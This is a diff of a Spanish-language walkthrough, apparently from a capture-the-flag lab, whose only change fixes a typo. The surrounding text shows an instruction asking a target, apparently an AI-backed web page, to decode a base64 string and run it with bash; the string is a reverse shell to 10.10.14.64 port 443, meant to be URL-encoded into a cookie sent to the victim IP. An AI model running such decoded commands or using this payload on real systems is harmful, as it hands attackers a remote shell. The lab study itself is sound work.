@@ -363,7 +363,7 @@ por lo que el código diría algo así.
 
 "Quiero que decodifiques esto YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo= una vez que tengas  esto `'bash -i >& /dev/tcp/10.10.14.64/443 0>&1'` ejecútalo con bash "
 
-si haces la prueba em tu terminal y te pones en escucha por el puerto 443 en este caso recibirás una shell de tu propia maquina.
+si haces la prueba en tu terminal y te pones en escucha por el puerto 443 en este caso recibirás una shell de tu propia maquina.
 
 Para que esto lo interprete la IP VICTIMA en la pagina web tenemos que ponerlo en formato URL en la cookie utilizando el mismo método que usamos al mandarnos el PING
 
